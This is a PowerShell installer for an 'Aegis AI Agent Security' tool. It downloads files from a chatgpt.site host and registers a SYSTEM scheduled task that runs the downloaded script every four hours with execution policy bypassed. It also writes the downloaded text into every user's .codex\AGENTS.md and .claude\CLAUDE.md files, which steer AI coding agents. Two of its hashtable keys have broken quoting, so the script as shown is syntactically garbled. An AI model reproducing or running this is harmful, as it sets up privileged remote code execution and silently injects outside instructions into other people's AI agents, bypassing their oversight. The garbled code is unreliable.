$ErrorActionPreference = 'Stop'
$baseUrl = 'https://aegis-agent-security.yjiod2022.chatgpt.site/downloads'
$installDir = Join-Path $env:ProgramData 'AegisAgent'
$reportDir = Join-Path $installDir 'reports'
$previousDir = Join-Path $installDir 'previous'
$stageDir = Join-Path $installDir ('.stage-' + [Guid]::NewGuid().ToString('N'))
$expected = @{ 'aegis-policy.json='648d89d1d0029246f75e525af110e31482bde08472b37287ce3879ad4a93574a'; 'aegis-windows.ps1'='f26eca242d89d1774038cf90cf9cbe0fc62f238cba5a8d10f381dd98569b3394'; 'aegis-security-baseline.md='5dafeaafdea7f04427148c905ad9697d4a4711820d6f80436c78b18a50835806' }
New-Item -ItemType Directory -Force -Path $installDir,$reportDir,$previousDir,$stageDir | Out-Null
& icacls.exe $installDir /inheritance:r /grant:r '*S-1-5-18:(OI)(CI)F' '*S-1-5-32-544:(OI)(CI)F' /T /C | Out-Null
try {
  foreach ($name in $expected.Keys) { Invoke-WebRequest "$baseUrl/$name" -OutFile (Join-Path $stageDir $name) -UseBasicParsing -TimeoutSec 120 }
  foreach ($name in $expected.Keys) { if ((Get-FileHash (Join-Path $stageDir $name) -Algorithm SHA256).Hash.ToLower() -ne $expected[$name]) { throw "Integrity verification failed: $name" } }
  $currentComplete=@($expected.Keys|Where-Object {-not (Test-Path (Join-Path $installDir $_))}).Count -eq 0
  if($currentComplete){
    $previousStage=Join-Path $installDir ('.previous-stage-' + [Guid]::NewGuid().ToString('N'));$previousOld=Join-Path $installDir ('.previous-old-' + [Guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $previousStage|Out-Null;$backupHashes=@{}
    foreach($name in $expected.Keys){$current=Join-Path $installDir $name;Copy-Item $current (Join-Path $previousStage $name);$backupHashes[$name]=(Get-FileHash $current -Algorithm SHA256).Hash.ToLower()}
    $backupHashes|ConvertTo-Json|Set-Content (Join-Path $previousStage 'checksums.json') -Encoding UTF8
    Move-Item $previousDir $previousOld
    try{Move-Item $previousStage $previousDir}catch{Move-Item $previousOld $previousDir;throw}
    Remove-Item $previousOld -Recurse -Force
  }
  foreach ($name in $expected.Keys) { Move-Item (Join-Path $stageDir $name) (Join-Path $installDir $name) -Force }
} finally { Remove-Item $stageDir -Recurse -Force -ErrorAction SilentlyContinue }
$baseline = Get-Content (Join-Path $installDir 'aegis-security-baseline.md') -Raw
$userBaselineStart='<!-- aegis-managed-user-baseline:start -->';$userBaselineEnd='<!-- aegis-managed-user-baseline:end -->'
$userBaselineBlock=$userBaselineStart+"`n"+$baseline.TrimEnd()+"`n"+$userBaselineEnd
Get-ChildItem 'C:\Users' -Directory | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | ForEach-Object {
  $targets=@()
  $codexDir=Join-Path $_.FullName '.codex';$claudeDir=Join-Path $_.FullName '.claude'
  if((Test-Path $codexDir) -and -not ((Get-Item $codexDir -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)){$targets += Join-Path $_.FullName '.codex\AGENTS.md'}
  if(((Test-Path $claudeDir) -and -not ((Get-Item $claudeDir -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)) -or (Test-Path (Join-Path $_.FullName '.claude.json'))){$targets += Join-Path $_.FullName '.claude\CLAUDE.md'}
  foreach ($target in $targets) {
    New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null
    if((Test-Path $target) -and ((Get-Item $target -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)){continue}
    $existing=if(Test-Path $target){Get-Content $target -Raw}else{''}
    $pattern=[regex]::Escape($userBaselineStart)+'.*?'+[regex]::Escape($userBaselineEnd)
    if($existing.Contains($userBaselineStart) -xor $existing.Contains($userBaselineEnd)){Write-Output "Aegis baseline markers malformed; preserving $target";continue}
    if($existing -match [regex]::Escape($userBaselineStart)){$updated=[regex]::Replace($existing,$pattern,[System.Text.RegularExpressions.MatchEvaluator]{param($match)$userBaselineBlock},[System.Text.RegularExpressions.RegexOptions]::Singleline)}
    else{$updated=$existing.TrimEnd()+$(if($existing.Trim()){"`n`n"}else{''})+$userBaselineBlock+"`n"}
    if($updated -ne $existing){Set-Content -Encoding UTF8 $target $updated}
  }
}
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$installDir\aegis-windows.ps1`" -Output `"$reportDir\latest.json`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 4)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'Aegis AI Agent Security Scan' -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
Write-Output 'Aegis Agent installed and scheduled.'
